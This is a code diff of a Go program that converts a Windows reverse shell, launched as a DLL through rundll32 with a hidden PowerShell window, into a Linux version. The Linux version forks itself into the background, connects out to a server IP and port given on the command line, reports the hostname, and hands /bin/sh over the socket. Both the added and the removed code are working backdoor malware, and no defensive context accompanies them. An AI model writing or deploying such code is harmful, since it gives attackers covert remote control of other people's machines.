@@ -1,32 +1,34 @@
-package main
+package oGllehS_Linux
 
 import (
-	"C"
 	"fmt"
 	"net"
 	"os"
 	"os/exec"
-	"strings"
-	"syscall"
 )
 
 func main() {
-
-}
-
-//export EntryPoint
-func EntryPoint(hwnd uintptr, hinst uintptr, lpszCmdLine *C.char, nCmdShow int32) {
-	// Parse command-line arguments
-	args := C.GoString(lpszCmdLine)
-	parts := strings.Split(args, " ")
-
-	if len(parts) < 2 {
-		fmt.Println("Usage: rundll32 remote_client.dll,EntryPoint <serverIP> <serverPort>")
-		return
+	// Ensure correct number of arguments
+	if len(os.Args) != 3 {
+		fmt.Println("Usage: ./program <serverIP> <serverPort>")
+		os.Exit(1)
 	}
 
-	serverIP := parts[0]
-	serverPort := parts[1]
+	// Check if already running in the background
+	if os.Getenv("IS_BACKGROUND") != "1" {
+		// Fork and detach the process
+		cmd := exec.Command(os.Args[0], os.Args[1:]...)
+		cmd.Env = append(os.Environ(), "IS_BACKGROUND=1")
+		cmd.Stdin = nil
+		cmd.Stdout = nil
+		cmd.Stderr = nil
+		cmd.Start()
+		os.Exit(0)
+	}
+
+	// Parse arguments
+	serverIP := os.Args[1]
+	serverPort := os.Args[2]
 	address := fmt.Sprintf("%s:%s", serverIP, serverPort)
 
 	// Connect to the server
@@ -41,18 +43,13 @@ func EntryPoint(hwnd uintptr, hinst uintptr, lpszCmdLine *C.char, nCmdShow int32
 	conn.Write([]byte("Connected to host: " + hostname + "\n"))
 
 	// Determine the shell
-	shell := "powershell.exe"
+	shell := "/bin/sh" // Default shell for Linux
 
 	// Create the command to execute the shell
 	cmd := exec.Command(shell)
 	cmd.Stdin = conn
 	cmd.Stdout = conn
 	cmd.Stderr = conn
-
-	// Set the process to be hidden
-	cmd.SysProcAttr = &syscall.SysProcAttr{
-		HideWindow: true,
-	}
 
 	// Start the shell process
 	if err := cmd.Run(); err != nil {
